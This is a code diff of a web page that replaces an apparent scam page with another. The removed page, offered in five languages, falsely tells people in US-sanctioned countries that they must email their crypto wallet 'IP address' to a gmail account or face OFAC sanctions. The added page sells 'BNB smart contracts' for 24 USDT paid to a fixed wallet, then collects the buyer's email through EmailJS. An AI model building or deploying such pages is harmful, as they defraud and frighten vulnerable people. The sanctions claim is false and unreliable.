@@ -1,241 +1,201 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>IP Wallet Registration</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-
-  <style>
-    body {
-      margin: 0;
-      font-family: Inter, sans-serif;
-      background: url("https://www.bitsight.com/sites/default/files/styles/16_9_large_2x/public/2023/01/04/OFAC-sanctions-vendor-risk-management.webp?itok=l_YbJgmh") center/cover no-repeat fixed;
-      min-height: 100vh;
-    }
-
-    .lang-switch {
-      position: fixed;
-      top: 12px;
-      right: 12px;
-      display: flex;
-      gap: 6px;
-      z-index: 10;
-    }
-
-    .lang-switch button {
-      border: none;
-      padding: 6px 10px;
-      border-radius: 6px;
-      background: #0d6efd;
-      color: #fff;
-      font-weight: 600;
-      cursor: pointer;
-    }
-
-    .container {
-      max-width: 420px;
-      margin: 90px auto 40px;
-      background: rgba(255, 255, 255, 0.78);
-      border-radius: 16px;
-      padding: 24px;
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.35);
-      backdrop-filter: blur(2px);
-    }
-
-    h1 {
-      text-align: center;
-      margin-bottom: 14px;
-      color: #222;
-    }
-
-    p {
-      font-size: 14px;
-      text-align: center;
-      color: #222;
-    }
-
-    ul {
-      margin: 20px 0;
-      padding-left: 18px;
-      color: #111;
-    }
-
-    ul li {
-      margin-bottom: 6px;
-    }
-
-    .email-actions {
-      display: flex;
-      gap: 12px;
-      justify-content: center;
-      margin: 18px 0;
-    }
-
-    .email-actions button {
-      flex: 1;
-      padding: 12px;
-      border-radius: 10px;
-      border: none;
-      font-weight: 600;
-      cursor: pointer;
-      background: #0d6efd;
-      color: #fff;
-      transition: background-color 0.3s;
-    }
-
-    .email-actions button:hover {
-      background: #084298;
-    }
-
-    .note {
-      text-align: center;
-      font-size: 1rem;
-      opacity: 0.9;
-      margin-bottom: 25px;
-    }
-
-    .wallets {
-      margin-top: 40px;
-      text-align: center;
-      font-size: 1rem;
-      font-weight: 600;
-      color: #111;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 18px;
-    }
-
-    .wallets span {
-      background-color: rgba(0, 0, 0, 0.15);
-      border-radius: 10px;
-      padding: 8px 16px;
-    }
-
-    footer {
-      text-align: center;
-      font-size: 12px;
-      color: #666;
-      margin-top: 20px;
-    }
-  </style>
-</head>
-
-<body>
-
-<div class="lang-switch">
-  <button onclick="setLang('en')">EN</button>
-  <button onclick="setLang('fa')">FA</button>
-  <button onclick="setLang('ru')">RU</button>
-  <button onclick="setLang('de')">DE</button>
-  <button onclick="setLang('zh')">ZH</button>
-</div>
-
-<div class="container">
-  <h1 id="title">IP Wallet Registration</h1>
-
-  <p id="desc">
-    People from countries sanctioned by the United States of America must register the IP address of their hot wallets and cryptocurrency wallets via email; otherwise, they will be subject to OFAC sanctions.
-  </p>
-
-  <ul>
-    <li>Iran</li>
-    <li>North Korea</li>
-    <li>Cuba</li>
-    <li>Syria</li>
-    <li>Crimea, Donetsk, Luhansk</li>
-    <li>Venezuela</li>
-    <li>Russia (restricted entities)</li>
-  </ul>
-
-  <div class="email-actions">
-    <button id="sendBtn" onclick="sendEmail()">Send Email</button>
-    <button id="copyBtn" onclick="copyEmail()">Copy Email</button>
-  </div>
-
-  <p class="note" id="note">
-    A real person should send a message from their personal email address to the email address provided on the page, include the name of their country, and prevent the blockage of their wallet via email.
-  </p>
-
-  <div class="wallets">
-    <span>Trust Wallet</span>
-    <span>MetaMask</span>
-    <span>SafePal</span>
-    <span>Coinbase</span>
-    <span>Exodus</span>
-    <span>Ledger</span>
-    <span>Electrum</span>
-    <span>Blockchain Wallet</span>
-    <span>Guarda</span>
-    <span>BRD</span>
-  </div>
-
-  <footer>
-    © 2026 IP Wallet Blockchain
-  </footer>
-</div>
-
+<meta charset="UTF-8">
+<title>BNB Smart Contract Sale</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-const emailAddress = "ipwalletchain@gmail.com";
-
-function sendEmail() {
-  window.location.href = "mailto:" + emailAddress;
+(function(){
+  emailjs.init("PakuuN4ADUDEqrzHl");
+})();
+</script>
+<style>
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:
+    linear-gradient(rgba(0,0,0,0.30), rgba(0,0,0,0.30)),
+    url("https://www.altcoinbuzz.io/wp-content/uploads/2022/08/Youtube-Thumbnails-Nov-2021-1.jpg");
+  background-repeat:no-repeat;
+  background-position:center top;
+  background-size:110%;
+  color:#fff;
 }
-
-function copyEmail() {
-  navigator.clipboard.writeText(emailAddress).then(() => {
-    alert("Email copied");
-  });
+.page{
+  min-height:100vh;
+  padding:80px 16px 140px;
+  display:flex;
+  justify-content:center;
 }
-
-function setLang(lang) {
-  const t = {
-    fa: {
-      title: "ثبت IP کیف پول",
-      desc: "مردم کشور های تحریم شده توسط ایالات متحده آمریکا باید آدرس IP کیف پول‌های گرم و کیف پول‌های ارز دیجیتال خود را از طریق ایمیل ثبت کنند، در غیر این صورت شامل تحریم‌های OFAC خواهند بود.",
-      note: "شخص حقیقی با ایمیل شخصی خود به آدرس ایمیل درج‌شده در صفحه پیام دهد و نام کشور خود را ارسال کند و از طریق ایمیل از مسدودی کیف پول خود جلوگیری کند!",
-      send: "ارسال ایمیل",
-      copy: "کپی ایمیل"
-    },
-    en: {
-      title: "IP Wallet Registration",
-      desc: "People from countries sanctioned by the United States of America must register the IP address of their hot wallets and cryptocurrency wallets via email; otherwise, they will be subject to OFAC sanctions.",
-      note: "A real person should send a message from their personal email address to the email address provided on the page, include the name of their country, and prevent the blockage of their wallet via email.",
-      send: "Send Email",
-      copy: "Copy Email"
-    },
-    ru: {
-      title: "Регистрация IP кошелька",
-      desc: "Граждане стран, находящихся под санкциями США, обязаны зарегистрировать IP-адреса своих криптовалютных кошельков по электронной почте, в противном случае они подпадут под санкции OFAC.",
-      note: "Физическое лицо должно отправить сообщение со своего личного электронного адреса на адрес, указанный на странице, указав название своей страны, чтобы предотвратить блокировку кошелька.",
-      send: "Отправить email",
-      copy: "Скопировать email"
-    },
-    de: {
-      title: "IP Wallet-Registrierung",
-      desc: "Personen aus von den Vereinigten Staaten sanktionierten Ländern müssen die IP-Adresse ihrer Krypto-Wallets per E-Mail registrieren, andernfalls unterliegen sie den OFAC-Sanktionen.",
-      note: "Eine natürliche Person muss von ihrer persönlichen E-Mail-Adresse eine Nachricht an die auf der Seite angegebene E-Mail-Adresse senden, den Namen ihres Landes angeben und eine Wallet-Sperrung verhindern.",
-      send: "E-Mail senden",
-      copy: "E-Mail kopieren"
-    },
-    zh: {
-      title: "IP 钱包注册",
-      desc: "来自受美国制裁国家的个人必须通过电子邮件注册其加密货币钱包的 IP 地址，否则将受到 OFAC 制裁。",
-      note: "个人应使用其个人电子邮件地址向页面中提供的电子邮件地址发送信息，说明其国家名称，并通过电子邮件防止钱包被封锁。",
-      send: "发送邮件",
-      copy: "复制邮箱"
+.box{
+  background:rgba(255,255,255,0.15);
+  backdrop-filter:blur(6px);
+  padding:32px;
+  border-radius:18px;
+  width:100%;
+  max-width:460px;
+  text-align:center;
+  box-shadow:0 25px 50px rgba(0,0,0,.5);
+}
+h1{
+  margin-bottom:14px;
+  letter-spacing:3px;
+  font-size:26px;
+}
+.subtitle{
+  font-size:14px;
+  line-height:1.7;
+  margin-bottom:22px;
+  opacity:0.95;
+}
+.btn{
+  width:100%;
+  padding:13px;
+  margin-top:12px;
+  background:#0d6efd;
+  border:none;
+  border-radius:12px;
+  color:#fff;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+  transition:0.3s;
+}
+.btn.secondary{
+  background:#198754;
+}
+.btn:disabled{
+  background:#6c757d;
+  cursor:not-allowed;
+  opacity:0.7;
+}
+.btn:hover:not(:disabled){
+  transform:translateY(-1px);
+  opacity:0.95;
+}
+.section{
+  margin-top:22px;
+  display:none;
+}
+.info{
+  background:rgba(0,0,0,.45);
+  padding:14px;
+  border-radius:12px;
+  font-size:14px;
+  margin-bottom:12px;
+  line-height:1.6;
+  word-break:break-all;
+}
+input{
+  width:100%;
+  padding:11px;
+  border-radius:10px;
+  border:none;
+  margin-top:10px;
+  font-size:14px;
+}
+.loader{
+  width:44px;
+  height:44px;
+  border:4px solid rgba(255,255,255,.3);
+  border-top:4px solid #0d6efd;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:22px auto;
+}
+@keyframes spin{
+  0%{transform:rotate(0deg)}
+  100%{transform:rotate(360deg)}
+}
+p{
+  font-size:14px;
+  line-height:1.6;
+}
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="box">
+    <h1>NEW CONTRACT</h1>
+    <div class="subtitle">
+      This platform provides the sale and creation of <b>BNB smart contracts</b>.<br>
+      You can create contracts on the <b>BNB Smart Chain (BSC)</b>
+      and receive your finalized contract via email.
+    </div>
+    <!-- Step 1 -->
+    <button class="btn" onclick="showPayment()">Create BNB Contract</button>
+    <!-- Step 2 -->
+    <div class="section" id="payment">
+      <div class="info">
+        Payment Network: <b>USDT BSC (BEP20)</b><br><br>
+        Wallet Address:<br>
+        <span id="walletAddress">
+          0xef42d9b6502ae425aeb4f28099a3041392481a52
+        </span><br><br>
+        Contract Price: <b>24 USDT</b>
+      </div>
+      <button class="btn secondary" id="copyBtn" onclick="copyAddress()">
+        Copy Address
+      </button>
+      <button class="btn" onclick="showEmail()">I Paid</button>
+    </div>
+    <!-- Step 3 -->
+    <div class="section" id="emailBox">
+      <input
+        type="email"
+        id="emailInput"
+        placeholder="Enter your email address"
+        oninput="checkEmail()"
+      >
+      <button class="btn" id="confirmBtn" onclick="sendEmail()" disabled>
+        Confirm
+      </button>
+    </div>
+    <!-- Step 4 -->
+    <div class="section" id="status">
+      <div class="loader"></div>
+      <p>
+        If the payment is completed successfully,<br>
+        your BNB contract will be reviewed and sent to your email.
+      </p>
+    </div>
+  </div>
+</div>
+<script>
+function showPayment(){
+  document.getElementById("payment").style.display="block";
+}
+function showEmail(){
+  document.getElementById("emailBox").style.display="block";
+}
+function sendEmail(){
+  const email = document.getElementById("emailInput").value;
+  emailjs.send(
+    "service_j8bd9vn",
+    "template_paduqpn",
+    {
+      email: email
     }
-  };
-
-  document.getElementById("title").innerText = t[lang].title;
-  document.getElementById("desc").innerText = t[lang].desc;
-  document.getElementById("note").innerText = t[lang].note;
-  document.getElementById("sendBtn").innerText = t[lang].send;
-  document.getElementById("copyBtn").innerText = t[lang].copy;
+  );
+  document.getElementById("status").style.display="block";
+}
+function copyAddress(){
+  const address = document.getElementById("walletAddress").innerText;
+  navigator.clipboard.writeText(address);
+  const btn = document.getElementById("copyBtn");
+  btn.innerText = "Address Copied ✔";
+  setTimeout(() => {
+    btn.innerText = "Copy Address";
+  }, 2000);
+}
+function checkEmail(){
+  const email = document.getElementById("emailInput").value;
+  const confirmBtn = document.getElementById("confirmBtn");
+  const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  confirmBtn.disabled = !isValid;
 }
 </script>
-
 </body>
 </html>
